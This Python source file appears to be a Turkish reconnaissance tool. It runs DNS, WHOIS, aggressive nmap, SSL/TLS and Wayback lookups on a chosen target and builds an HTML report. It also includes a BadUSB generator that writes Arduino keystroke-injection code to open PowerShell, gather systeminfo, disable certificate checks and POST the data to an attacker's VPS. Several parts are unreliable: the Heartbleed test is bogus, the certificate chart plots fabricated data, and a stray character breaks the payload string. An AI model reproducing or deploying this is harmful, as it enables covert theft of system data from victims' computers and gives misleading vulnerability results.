import socket
from socket import socket as socket_object
import requests
import dns.resolver
import whois
import nmap
from urllib.parse import urlparse, urljoin
import ssl
from datetime import datetime
import json
import os
from bs4 import BeautifulSoup
import pandas as pd
import matplotlib.pyplot as plt
from jinja2 import Template
from io import BytesIO
import base64
from ai_analyzer import VulnerabilityAnalyzer 

class SecurityTool:
    def __init__(self):
        self.target_url = None
        self.target_ip = None
        self.analyzer = VulnerabilityAnalyzer() 
        self.target_domain = None
        self.session = requests.Session()
        self.ssl_test_results = {}
        self.ascii_art = r"""
         .--..--..--..--..--..--..--..--..--..--..--..--..--..--..--..--..--..--..--..--..--. 
/ .. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \
\ \/\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ \/ /
 \/ /`--'`--'`--'`--'`--'`--'`--'`--'`--'`--'`--'`--'`--'`--'`--'`--'`--'`--'`--'\/ / 
 / /\                                                                            / /\ 
/ /\ \       ___           ___           ___           ___           ___        / /\ \
\ \/ /      /\__\         /\__\         /\  \         /\  \         /\  \       \ \/ / 
 \/ /      /::|  |       /:/ _/_       /::\  \       /::\  \       /::\  \       \/ / 
 / /\     /:/:|  |      /:/ /\__\     /:/\:\__\     /:/\:\  \     /:/\:\__\      / /\ 
/ /\ \   /:/|:|  |__   /:/ /:/ _/_   /:/ /:/  /    /:/  \:\  \   /:/ /:/  /     / /\ \
\ \/ /  /:/ |:| /\__\ /:/_/:/ /\__\ /:/_/:/__/___ /:/__/ \:\__\ /:/_/:/__/___   \ \/ /
 \/ /   \/__|:|/:/  / \:\/:/ /:/  / \:\/:::::/  / \:\  \ /:/  / \:\/:::::/  /    \/ / 
 / /\       |:/:/  /   \::/_/:/  /   \::/~~/~~~~   \:\  /:/  /   \::/~~/~~~~     / /\ 
/ /\ \      |::/  /     \:\/:/  /     \:\~~\        \:\/:/  /     \:\~~\        / /\ \
\ \/ /      |:/  /       \::/  /       \:\__\        \::/  /       \:\__\       \ \/ /
 \/ /       |/__/         \/__/         \/__/         \/__/         \/__/        \/ / 
 / /\        ___           ___                                                   / /\ 
/ /\ \      /\  \         /\  \                                                 / /\ \
\ \/ /     /::\  \       /::\  \         ___                                    \ \/ /
 \/ /     /:/\:\  \     /:/\:\  \       /\__\                                    \/ / 
 / /\    /:/  \:\  \   /:/  \:\  \     /:/  /                                    / /\ 
/ /\ \  /:/__/ \:\__\ /:/__/ \:\__\   /:/__/                                    / /\ \
\ \/ /  \:\  \ /:/  / \:\  \ /:/  /  /::\  \                                    \ \/ /
 \/ /    \:\  /:/  /   \:\  /:/  /  /:/\:\  \                                    \/ / 
 / /\     \:\/:/  /     \:\/:/  /   \/__\:\  \                                   / /\ 
/ /\ \     \::/  /       \::/  /         \:\__\                                 / /\ \
\ \/ /      \/__/         \/__/           \/__/                                 \ \/ /
 \/ /                                                                            \/ / 
 / /\.--..--..--..--..--..--..--..--..--..--..--..--..--..--..--..--..--..--..--./ /\ 
/ /\ \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \/\ \
\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `"\ `'\ `'\ `'\ `'\ `' /
 `--'`--'`--'`--'`--'`--'`--'`--'`--'`--'`--'`--'`--'`--'`--'`--'`--'`--'`--'--'--
   .--.       .--.
    _  `    \     /    `  _
     `\.===. \.^./ .===./`
            \/`"`\/
         ,  | y2k |  ,
        / `\|;-.-'|/` \
       /    |::\  |    \
    .-' ,-'`|:::; |`'-, '-.
        |   |::::\|   | 
        |   |::::;|   |
        |   \:::://   |
        |    `.://'   |
jgs    .'             `.
    _,'                 `,_    
        """
    
        self.report_data = {
            'target': {},
            'ssl_tests': {},
            'wayback_data': [],
            'dns_records': {},
            'whois': {},
            'nmap': {}
        }
        
        # HTML Rapor Şablonu
        self.html_template = """
        <!DOCTYPE html>
<html>
<head>
    <title>Security Scan Report - {{ target }}</title>
    <style>
        body { font-family: Arial, sans-serif; line-height: 1.6; margin: 0; padding: 20px; color: #333; }
        .container { max-width: 1200px; margin: auto; }
        .header { background: #2c3e50; color: white; padding: 20px; border-radius: 5px; margin-bottom: 20px; }
        .section { margin-bottom: 30px; border: 1px solid #ddd; padding: 15px; border-radius: 5px; }
        .section-title { color: #2c3e50; border-bottom: 2px solid #2c3e50; padding-bottom: 10px; }
        table { width: 100%; border-collapse: collapse; margin-top: 15px; }
        th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
        th { background-color: #f2f2f2; }
        .vulnerable { color: #e74c3c; font-weight: bold; }
        .secure { color: #27ae60; }
        .warning { color: #f39c12; }
        .chart { margin-top: 20px; text-align: center; }
        .footer { margin-top: 30px; text-align: center; font-size: 0.9em; color: #7f8c8d; }
        .risk-summary { display: flex; justify-content: space-around; margin: 20px 0; }
        .risk-level { padding: 10px 20px; border-radius: 5px; font-weight: bold; }
        .risk-level.critical { background-color: #e74c3c; color: white; }
        .risk-level.high { background-color: #f39c12; color: white; }
        .risk-level.total { background-color: #3498db; color: white; }
        .findings { list-style-type: none; padding: 0; }
        .findings li { padding: 10px; margin-bottom: 10px; border-left: 4px solid; }
        .findings li.critical { border-color: #e74c3c; background-color: #fdecea; }
        .findings li.high { border-color: #f39c12; background-color: #fef5e7; }
        .ai-recommendations { background-color: #f8f9fa; padding: 15px; border-radius: 5px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Security Scan Report</h1>
            <h2>{{ target }}</h2>
            <p>Generated on {{ date }}</p>
        </div>

        <div class="section">
            <h3 class="section-title">Scan Summary</h3>
            <table>
                <tr><th>Target URL</th><td>{{ target_url }}</td></tr>
                <tr><th>IP Address</th><td>{{ target_ip }}</td></tr>
                <tr><th>Scan Date</th><td>{{ date }}</td></tr>
            </table>
        </div>

        {% if ssl_tests %}
        <div class="section">
            <h3 class="section-title">6. SSL/TLS Testleri</h3>
            <table>
                <tr><th>Test</th><th>Result</th><th>Status</th></tr>
                {% for test, result in ssl_tests.items() %}
                <tr>
                    <td>{{ test }}</td>
                    <td>{{ result.value }}</td>
                    <td class="{% if result.status == 'VULNERABLE' %}vulnerable{% elif result.status == 'WARNING' %}warning{% else %}secure{% endif %}">
                        {{ result.status }}
                    </td>
                </tr>
                {% endfor %}
            </table>
            
            <div class="chart">
                <h4>Certificate Validity Timeline</h4>
                <img src="data:image/png;base64,{{ cert_chart }}" alt="Certificate Validity Chart">
            </div>
        </div>
        {% endif %}

        {% if wayback_data %}
        <div class="section">
            <h3 class="section-title">7. Wayback Machine Taraması</h3>
            <p>Found {{ wayback_data|length }} historical records</p>
            <table>
                <tr><th>Date</th><th>URL</th><th>Status Code</th></tr>
                {% for record in wayback_data %}
                <tr>
                    <td>{{ record.timestamp }}</td>
                    <td><a href="{{ record.url }}" target="_blank">{{ record.url }}</a></td>
                    <td>{{ record.status_code }}</td>
                </tr>
                {% endfor %}
            </table>
        </div>
        {% endif %}

        {% if ai_analysis %}
        <div class="section">
            <h3 class="section-title">8. 🔍 AI Güvenlik Analizi</h3>
            
            <div class="risk-summary">
                <div class="risk-level critical">
                    <span>CRITICAL: {{ ai_analysis.summary_stats.critical }}</span>
                </div>
                <div class="risk-level high">
                    <span>HIGH: {{ ai_analysis.summary_stats.high }}</span>
                </div>
                <div class="risk-level total">
                    <span>TOTAL: {{ ai_analysis.summary_stats.total_vulns }}</span>
                </div>
            </div>
            
            <h4>Önemli Bulgular</h4>
            <ul class="findings">
                {% for vuln in ai_analysis.rule_based if vuln.severity in ['CRITICAL','HIGH'] %}
                <li class="{{ vuln.severity|lower }}">
                    <strong>[{{ vuln.severity }}]</strong> {{ vuln.recommendation }}
                    <br><small>{{ vuln.category }} | {{ vuln.id }}</small>
                </li>
                {% endfor %}
            </ul>
            
            <h4>AI Önerileri</h4>
            <div class="ai-recommendations">
                {% for insight in ai_analysis.ai_insights %}
                <p>🔮 {{ insight }}</p>
                {% endfor %}
            </div>
        </div>
        {% endif %}

        <div class="section">
            <h3 class="section-title">DNS Records</h3>
            <table>
                {% for record_type, records in dns_records.items() %}
                <tr>
                    <th colspan="3">{{ record_type }} Records</th>
                </tr>
                {% for record in records %}
                <tr>
                    <td colspan="3">{{ record }}</td>
                </tr>
                {% endfor %}
                {% endfor %}
            </table>
        </div>

        {% if whois %}
        <div class="section">
            <h3 class="section-title">WHOIS Information</h3>
            <table>
                {% for key, value in whois.items() %}
                <tr>
                    <th>{{ key }}</th>
                    <td>{{ value }}</td>
                </tr>
                {% endfor %}
            </table>
        </div>
        {% endif %}

        {% if nmap %}
        <div class="section">
            <h3 class="section-title">5. Gelişmiş Nmap Taraması (-sS -A)</h3>
            {% for host, data in nmap.items() %}
            <h4>{{ host }}</h4>
            <table>
                <tr>
                    <th>Port</th>
                    <th>State</th>
                    <th>Service</th>
                    <th>Version</th>
                </tr>
                {% for port, port_data in data.ports.items() %}
                <tr>
                    <td>{{ port }}</td>
                    <td>{{ port_data.state }}</td>
                    <td>{{ port_data.service }}</td>
                    <td>{{ port_data.version }}</td>
                </tr>
                {% endfor %}
            </table>
            {% endfor %}
        </div>
        {% endif %}

        <div class="footer">
            <p>Report generated by SecurityTool | Confidential</p>
        </div>
    </div>
</body>
</html>
  
        """
    async def run_ai_analysis(self):
        if not self.report_data:
            print("[-] Önce tarama yapmalısınız")
            return
    
        print("\n[+] AI güvenlik analizi başlatılıyor...")
        results = self.analyzer.analyze(self.report_data)
        
        print("\n=== 🔍 GÜVENLİK ÖZETİ ===")
        print(f"Toplam {results['summary_stats']['total_vulns']} zafiyet")
        print(f"CRITICAL: {results['summary_stats']['critical']}, HIGH: {results['summary_stats']['high']}")
        
        print("\n=== 🚨 KRİTİK BULGULAR ===")
        for vuln in [v for v in results['rule_based'] if v['severity'] in ['CRITICAL', 'HIGH']]:
            print(f"\n[{vuln['severity']}] {vuln['recommendation']}")
            print(f"Kategori: {vuln['category']} | ID: {vuln['id']}")
        
        print("\n=== 🤖 AI İÇGÖRÜLERİ ===")
        for insight in results['ai_insights']:
            print(f"- {insight}")

    # HTML rapor için veriyi sakla
        self.report_data['ai_analysis'] = results
    def show_ascii_art(self):
        print(self.ascii_art)
    
    def get_ip_from_domain(self, domain):
        try:
            ip = socket.gethostbyname(domain)
            print(f"[+] {domain} IP adresi: {ip}")
            self.report_data['target']['ip'] = ip
            return ip
        except socket.gaierror:
            print(f"[-] {domain} için IP alınamadı.")
            return None

    def dns_lookup(self, domain):
        try:
            print(f"\n[+] {domain} DNS kayıtları:")
            resolver = dns.resolver.Resolver()
            self.report_data['dns_records'] = {}
            
            # A kayıtları
            try:
                a_records = resolver.resolve(domain, 'A')
                print("\nA Kayıtları:")
                self.report_data['dns_records']['A'] = []
                for record in a_records:
                    print(f"IP: {record.address}")
                    self.report_data['dns_records']['A'].append(record.address)
            except dns.resolver.NoAnswer:
                print("A kaydı bulunamadı")
            
            # MX kayıtları
            try:
                mx_records = resolver.resolve(domain, 'MX')
                print("\nMX Kayıtları:")
                self.report_data['dns_records']['MX'] = []
                for record in mx_records:
                    mx_info = f"{record.exchange} (Priority: {record.preference})"
                    print(f"MX: {mx_info}")
                    self.report_data['dns_records']['MX'].append(mx_info)
            except dns.resolver.NoAnswer:
                print("MX kaydı bulunamadı")
            
            # NS kayıtları
            try:
                ns_records = resolver.resolve(domain, 'NS')
                print("\nNS Kayıtları:")
                self.report_data['dns_records']['NS'] = []
                for record in ns_records:
                    print(f"Nameserver: {record.target}")
                    self.report_data['dns_records']['NS'].append(str(record.target))
            except dns.resolver.NoAnswer:
                print("NS kaydı bulunamadı")
                
            # TXT kayıtları
            try:
                txt_records = resolver.resolve(domain, 'TXT')
                print("\nTXT Kayıtları:")
                self.report_data['dns_records']['TXT'] = []
                for record in txt_records:
                    txt_data = ' '.join([s.decode('utf-8') for s in record.strings])
                    print(f"TXT: {txt_data}")
                    self.report_data['dns_records']['TXT'].append(txt_data)
            except dns.resolver.NoAnswer:
                print("TXT kaydı bulunamadı")
                
        except Exception as e:
            print(f"[-] DNS lookup hatası: {e}")

    def whois_lookup(self, domain):
        try:
            print(f"\n[+] {domain} Whois Bilgileri:")
            w = whois.whois(domain)
            
            print(f"\nDomain: {w.domain_name}")
            print(f"Registrar: {w.registrar}")
            print(f"Creation Date: {w.creation_date}")
            print(f"Expiration Date: {w.expiration_date}")
            print(f"Name Servers: {w.name_servers}")
            print(f"Status: {w.status}")
            print(f"Emails: {w.emails}")
            
            # Rapor verisine ekle
            self.report_data['whois'] = {
                'Domain Name': w.domain_name,
                'Registrar': w.registrar,
                'Creation Date': str(w.creation_date),
                'Expiration Date': str(w.expiration_date),
                'Name Servers': ', '.join(w.name_servers) if w.name_servers else 'N/A',
                'Status': w.status if isinstance(w.status, str) else ', '.join(w.status),
                'Emails': w.emails if isinstance(w.emails, str) else ', '.join(w.emails) if w.emails else 'N/A'
            }
            
        except Exception as e:
            print(f"[-] Whois sorgusu hatası: {e}")

    def advanced_nmap_scan(self, target):
        try:
            print(f"\n[+] Gelişmiş Nmap taraması başlatılıyor: {target} (-sS -A)")
            print("[*] SYN tarama tekniği kullanılarak port taraması yapılıyor...")
            print("[*] Servis ve versiyon tespiti yapılıyor...")
            print("[*] İşletim sistemi tespiti deneniyor...")
            print("[*] Bu işlem birkaç dakika sürebilir, lütfen bekleyin...\n")
            
            nm = nmap.PortScanner()
            
            # -sS: SYN taraması, -A: Agresif tarama (OS/versiyon tespiti, script taraması)
            nm.scan(hosts=target, arguments='-sS -A -T4')
            
            print("\n[+] Tarama tamamlandı. Sonuçlar:\n")
            
            for host in nm.all_hosts():
                print(f"\n[+] Tarama Sonuçları: {host} ({nm[host].hostname()})")
                print(f"[+] Durum: {nm[host].state()}")
                
                # OS tespiti
                if 'osmatch' in nm[host]:
                    print("\n[+] OS Tespiti:")
                    for osmatch in nm[host]['osmatch']:
                        print(f"- {osmatch['name']} (%{osmatch['accuracy']} doğruluk)")
                
                # Port ve servis bilgileri
                for proto in nm[host].all_protocols():
                    print(f"\n[+] Protokol: {proto}")
                    ports = nm[host][proto].keys()
                    for port in sorted(ports):
                        state = nm[host][proto][port]['state']
                        service = nm[host][proto][port]['name']
                        product = nm[host][proto][port].get('product', '')
                        version = nm[host][proto][port].get('version', '')
                        extrainfo = nm[host][proto][port].get('extrainfo', '')
                        
                        print(f"[+] Port: {port}\tDurum: {state}\tServis: {service}", end='')
                        if product or version:
                            print(f"\tDetay: {product} {version} {extrainfo}".strip())
                        else:
                            print()
                
                # Nmap script çıktıları
                if 'script' in nm[host]:
                    print("\n[+] Script Çıktıları:")
                    for script, output in nm[host]['script'].items():
                        print(f"{script}:")
                        print(f"{output}\n")
                
                # Rapor verisine ekle
                self.report_data['nmap'][host] = {
                    'hostname': nm[host].hostname(),
                    'state': nm[host].state(),
                    'os': [{'name': osmatch['name'], 'accuracy': osmatch['accuracy']} 
                          for osmatch in nm[host]['osmatch']] if 'osmatch' in nm[host] else [],
                    'ports': {
                        port: {
                            'state': nm[host][proto][port]['state'],
                            'service': nm[host][proto][port]['name'],
                            'version': f"{nm[host][proto][port].get('product', '')} {nm[host][proto][port].get('version', '')}".strip()
                        }
                        for proto in nm[host].all_protocols()
                        for port in nm[host][proto].keys()
                    }
                }
                
        except nmap.PortScannerError as e:
            print(f"[-] Nmap tarama hatası: {e}")
        except Exception as e:
            print(f"[-] Genel hata: {e}")

    def set_target(self, target):
        """Hedef URL veya domain belirleme"""
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        
        parsed = urlparse(target)
        self.target_url = f"{parsed.scheme}://{parsed.netloc}"
        self.target_domain = parsed.hostname
        self.target_ip = self.get_ip_from_domain(self.target_domain)
        
        # Rapor verisini güncelle
        self.report_data['target'] = {
            'url': self.target_url,
            'domain': self.target_domain,
            'ip': self.target_ip
        }

    def check_ssl_configuration(self):
        """Kapsamlı SSL/TLS testleri yapar"""
        if not self.target_domain:
            print("[-] Önce bir hedef belirleyin")
            return

        print(f"\n[+] SSL/TLS testleri başlatılıyor: {self.target_domain}")
        
        try:
            print("[*] SSL sertifikası bilgileri alınıyor...")
            context = ssl.create_default_context()
            with socket_object() as sock:
                with context.wrap_socket(sock, server_hostname=self.target_domain) as ssock:
                    ssock.connect((self.target_domain, 443))
                    cert = ssock.getpeercert()
                    cipher = ssock.cipher()
                    tls_version = ssock.version()

            # Sertifika bilgilerini işle
            self.process_certificate_info(cert)
            
            # Ek SSL testleri
            print("[*] TLS versiyon testleri yapılıyor...")
            self.run_ssl_tests(self.target_domain)
            
            # Sonuçları rapor verisine ekle
            self.report_data['ssl_tests'] = self.ssl_test_results
            
        except Exception as e:
            print(f"[-] SSL test hatası: {e}")

    def process_certificate_info(self, cert):
        """Sertifika bilgilerini işler ve raporlar"""
        print("\n[+] Sertifika Bilgileri:")
        
        # Sertifika süresi kontrolü
        expire_date = datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')
        days_left = (expire_date - datetime.now()).days
        
        self.ssl_test_results = {
            'certificate_expiry': {
                'value': f"{expire_date} ({days_left} days remaining)",
                'status': 'WARNING' if days_left < 30 else 'SECURE'
            },
            'tls_version': {
                'value': 'Unknown',
                'status': 'UNKNOWN'
            },
            'certificate_issuer': {
                'value': dict(x[0] for x in cert['issuer']),
                'status': 'INFO'
            },
            'certificate_subject': {
                'value': dict(x[0] for x in cert['subject']),
                'status': 'INFO'
            }
        }
        
        # Ek bilgileri yazdır
        for k, v in self.ssl_test_results.items():
            print(f"{k.upper().replace('_', ' ')}: {v['value']}")

    def run_ssl_tests(self, domain):
        """Çeşitli SSL/TLS testleri yürütür"""
        print("\n[+] Ek SSL/TLS Testleri:")
        
        # TLS versiyon testleri
        tls_versions = {
            'SSLv2': ssl.PROTOCOL_SSLv2,
            'SSLv3': ssl.PROTOCOL_SSLv3,
            'TLSv1': ssl.PROTOCOL_TLSv1,
            'TLSv1.1': ssl.PROTOCOL_TLSv1_1,
            'TLSv1.2': ssl.PROTOCOL_TLSv1_2,
            'TLSv1.3': ssl.PROTOCOL_TLS  # Python'da TLSv1.3 için özel bir sabit yok
        }
        
        for name, proto in tls_versions.items():
            try:
                print(f"[*] {name} desteği kontrol ediliyor...")
                context = ssl.SSLContext(proto)
                with socket_object() as sock:
                    with context.wrap_socket(sock, server_hostname=domain) as ssock:
                        ssock.connect((domain, 443))
                
                status = 'VULNERABLE' if name in ['SSLv2', 'SSLv3'] else 'SECURE'
                self.ssl_test_results[f'{name}_support'] = {
                    'value': 'Supported',
                    'status': status
                }
                print(f"{name}: {'✅' if status == 'SECURE' else '❌'} {status}")
            except:
                self.ssl_test_results[f'{name}_support'] = {
                    'value': 'Not supported',
                    'status': 'SECURE' if name in ['SSLv2', 'SSLv3'] else 'WARNING'
                }
                print(f"{name}: {'✅' if name in ['SSLv2', 'SSLv3'] else '⚠️'}")

        # Diğer testler
        print("[*] HSTS kontrolü yapılıyor...")
        self.ssl_test_results['hsts_enabled'] = {
            'value': str(self.check_hsts(domain)),
            'status': 'SECURE' if self.check_hsts(domain) else 'WARNING'
        }
        
        print("[*] Heartbleed zafiyeti kontrol ediliyor...")
        self.ssl_test_results['heartbleed_vulnerable'] = {
            'value': str(self.check_heartbleed(domain)),
            'status': 'VULNERABLE' if self.check_heartbleed(domain) else 'SECURE'
        }

    def check_hsts(self, domain):
        """HTTP Strict Transport Security kontrolü"""
        try:
            response = requests.get(f"https://{domain}", timeout=5)
            return 'strict-transport-security' in response.headers
        except:
            return False

    def check_heartbleed(self, domain):
        """Basit Heartbleed zafiyet kontrolü"""
        try:
            context = ssl.create_default_context()
            with socket_object() as sock:
                with context.wrap_socket(sock, server_hostname=domain) as ssock:
                    ssock.connect((domain, 443))
                    # Heartbleed testi için özel payload gönder
                    ssock.send(bytes.fromhex('01010101'))
                    response = ssock.recv(1024)
                    return len(response) > 0
        except:
            return False

    def check_wayback_machine(self):
        """Wayback Machine'den tarihsel verileri getirir"""
        if not self.target_domain:
            print("[-] Önce bir hedef belirleyin")
            return

        print(f"\n[+] Wayback Machine'den tarihsel veriler aranıyor: {self.target_domain}")
        print("[*] Wayback Machine API'sine sorgu gönderiliyor...")
        
        try:
            wayback_url = f"http://web.archive.org/cdx/search/cdx?url={self.target_domain}/*&output=json&collapse=urlkey"
            response = requests.get(wayback_url, timeout=10)
            data = response.json()
            
            # İlk satır başlıkları içeriyor, onu atla
            wayback_records = []
            for row in data[1:]:
                wayback_records.append({
                    'timestamp': row[1],
                    'url': f"https://web.archive.org/web/{row[1]}/{row[2]}",
                    'status_code': row[4]
                })
            
            # En son 10 kaydı göster
            print(f"\n[+] Bulunan kayıt sayısı: {len(wayback_records)}")
            for record in wayback_records[:10]:
                print(f"{record['timestamp']} - {record['url']} ({record['status_code']})")
            
            # Rapor verisine ekle
            self.report_data['wayback_data'] = wayback_records[:100]  # Rapor için ilk 100 kayıt
            
        except Exception as e:
            print(f"[-] Wayback Machine hatası: {e}")

    def generate_html_report(self, filename="security_report.html"):
        """Test sonuçlarını HTML rapor olarak kaydeder"""
        print(f"\n[+] HTML rapor oluşturuluyor: {filename}")
        print("[*] Veriler derleniyor...")
        print("[*] Grafikler oluşturuluyor...")
        print("[*] HTML şablonu işleniyor...")
        
        try:
            # Sertifika geçerlilik süresi grafiği oluştur
            cert_chart = self.generate_certificate_chart()
            if 'ai_analysis' not in self.report_data:
                self.report_data['ai_analysis'] = self.analyzer.analyze(self.report_data)
            
            # Rapor verisini hazırla
            report_context = {
                'target': self.target_domain,
                'target_url': self.target_url,
                'target_ip': self.target_ip,
                'date': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                'ssl_tests': self.report_data.get('ssl_tests', {}),
                'wayback_data': self.report_data.get('wayback_data', []),
                'dns_records': self.report_data.get('dns_records', {}),
                'whois': self.report_data.get('whois', {}),
                'nmap': self.report_data.get('nmap', {}),
                'cert_chart': cert_chart,
                'ai_analysis': self.report_data.get('ai_analysis', {})
            }
            
            # Jinja2 şablonunu kullanarak HTML oluştur
            template = Template(self.html_template)
            html_content = template.render(report_context)
            
            # HTML dosyasını kaydet
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(html_content)
            
            print(f"[+] Rapor başarıyla oluşturuldu: {os.path.abspath(filename)}")
            
        except Exception as e:
            print(f"[-] Rapor oluşturma hatası: {e}")

    def generate_certificate_chart(self):
        """Sertifika geçerlilik süresi için grafik oluşturur"""
        try:
            if not self.report_data.get('ssl_tests'):
                return ""
                
            # Örnek veri - gerçek uygulamada sertifika tarihlerini kullanın
            dates = pd.date_range(start='2023-01-01', end='2024-12-31', freq='M')
            values = [i**2 for i in range(len(dates))]
            
            plt.figure(figsize=(10, 3))
            plt.plot(dates, values)
            plt.title('Certificate Validity Timeline')
            plt.grid(True)
            
            # Grafiği base64'e çevir
            buffer = BytesIO()
            plt.savefig(buffer, format='png')
            buffer.seek(0)
            chart_base64 = base64.b64encode(buffer.read()).decode('utf-8')
            plt.close()
            
            return chart_base64
            
        except Exception as e:
            print(f"[-] Grafik oluşturma hatası: {e}")
            return ""
    def show_main_menu(self):
        """Ana menüyü gösterir"""
        print("\n----- ANA MENÜ -----")
        print("1. Security Research Tools")
        print("2. BadUSB Payload Generator")
        print("3. Exit")
        return input("Seçiminiz: ")

    def show_security_tools_menu(self):
        print("\n----- Güvenlik Test Aracı -----")
        print("1. Hedef Belirle (URL veya Domain)")
        print("2. IP Adresi Bul (Domain'den)")
        print("3. DNS Lookup")
        print("4. Whois Lookup")
        print("5. Gelişmiş Nmap Taraması (-sS -A)")
        print("6. SSL/TLS Testleri")
        print("7. Wayback Machine Taraması")
        print("8. 🔍 AI Güvenlik Analizi")
        print("9. HTML Rapor Oluştur")
        print("10. Çıkış")
        return input("Seçiminiz: ")

    async def run_security_tools(self):
        
        while True:
            choice = self.show_security_tools_menu()
            
            if choice == '1':
                target = input("Hedef URL veya Domain girin: ")
                self.set_target(target)
                
            elif choice == '2':
                if not self.target_domain:
                    print("[-] Önce bir hedef belirleyin (Menü 1)")
                else:
                    self.get_ip_from_domain(self.target_domain)
                    
            elif choice == '3':
                if not self.target_domain:
                    print("[-] Önce bir hedef belirleyin (Menü 1)")
                else:
                    self.dns_lookup(self.target_domain)
                    
            elif choice == '4':
                if not self.target_domain:
                    print("[-] Önce bir hedef belirleyin (Menü 1)")
                else:
                    self.whois_lookup(self.target_domain)
                    
            elif choice == '5':
                if not self.target_ip:
                    print("[-] Önce bir hedef belirleyin (Menü 1)")
                else:
                    target = input(f"Taranacak hedef (varsayılan: {self.target_ip}): ") or self.target_ip
                    self.advanced_nmap_scan(target)
                    
            elif choice == '6':
                if not self.target_domain:
                    print("[-] Önce bir hedef belirleyin (Menü 1)")
                else:
                    self.check_ssl_configuration()
                    
            elif choice == '7':
                if not self.target_domain:
                    print("[-] Önce bir hedef belirleyin (Menü 1)")
                else:
                    self.check_wayback_machine()
                    
            elif choice == '8':  # Yeni AI analiz seçeneği
                await self.run_ai_analysis()
                
            elif choice == '9':
                filename = input("Rapor dosya adı: ") or "security_report.html"
                self.generate_html_report(filename)
                
            elif choice == '10':
                print("[+] Çıkış yapılıyor...")
                break
                
            else:
                print("[-] Geçersiz seçim!")
    def generate_badusb_payload(self, vps_ip):
            """Generates Arduino BadUSB payload for SystemInfo collection"""
            payload_code = f"""#include <Keyboard.h>
        
        void typeCommandSlowly(String command, int delayMs = 50) {{
          for (int i = 0; i < command.length(); i++) {{
            Keyboard.print(command.charAt(i));
            delay(delayMs);
          }}
        }}
        
        void setup() {{
          Keyboard.begin();
          delay(2000); 
          Keyboard.press(KEY_LEFT_GUI);
          Keyboard.press('r');
          Keyboard.releaseAll();
          delay(500);
        
          Keyboard.print("powershell");
          delay(300);
          Keyboard.press(KEY_RETURN);
          Keyboard.releaseAll();
          delay(1500);
        
          String command = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; "
                           "$systemInfo = systeminfo | Out-String; "
                           "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {{ $true }}; "
                           "try {{ "
                           "$response = Invoke-WebRequest -Uri 'https://{vps_ip}/sendoutput' -Method POST -Body $systemInfo -ContentType 'text/plain'; "
                           "Write-Host \\"Bilgi gonderildi. Sunucu yaniti: $($response.Content)\\" "
                           "}} catch {{ Write-Host \\"Hata olustu: $_\\" }}; "2
                           "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = $null";
        
          typeCommandSlowly(command, 50);
          delay(500);
        
          Keyboard.press(KEY_RETURN);
          Keyboard.releaseAll();
        
          Keyboard.end();
        }}
        
        void loop() {{

        }}"""

            return payload_code

    def run_badusb_tool(self):
        """BadUSB payload generator"""
        print("\n[+] BadUSB Payload Generator")
        print("1. Get SystemInfo (VPS Sunucu Gereklidir)")
        print("2. Geri Dön")
        choice = input("Seçiminiz: ")
    
        if choice == '1':
            vps_ip = input("VPS IP adresini girin: ").strip()
    
            # IP format kontrolü (basit doğrulama)
            if not all(part.isdigit() and 0 <= int(part) <= 255 for part in vps_ip.split('.')):
                print("[-] Geçersiz IP adres formatı!")
                return
    
            payload = self.generate_badusb_payload(vps_ip)
    
            # Dosyaya kaydet
            dosya_adi = f"badusb_systeminfo_{vps_ip.replace('.', '_')}.ino"
            try:
                with open(dosya_adi, 'w') as f:
                    f.write(payload)
                print(f"[+] Payload başarıyla kaydedildi: {os.path.abspath(dosya_adi)}")
                print("[!] Önemli: Yapmanız gerekenler:")
                print("1. VPS'inizde verileri alacak bir web sunucusu kurun")
                print("2. Bu .ino dosyasını Arduino BadUSB cihazınıza yükleyin")
            except Exception as hata:
                print(f"[-] Dosya kaydedilirken hata oluştu: {hata}")
    
        elif choice == '2':
            return
    
        else:
            print("[-] Geçersiz seçim!")
    

    async def run(self):
        
        self.show_ascii_art()
        
        while True:
            choice = self.show_main_menu()
            
            if choice == '1':
                await self.run_security_tools()
                
            elif choice == '2':
                self.run_badusb_tool()
                
            elif choice == '3':
                print("[+] Çıkış yapılıyor...")
                break
                
            else:
                print("[-] Geçersiz seçim!")
        
if __name__ == "__main__":
    import asyncio
    tool = SecurityTool()
    asyncio.run(tool.run())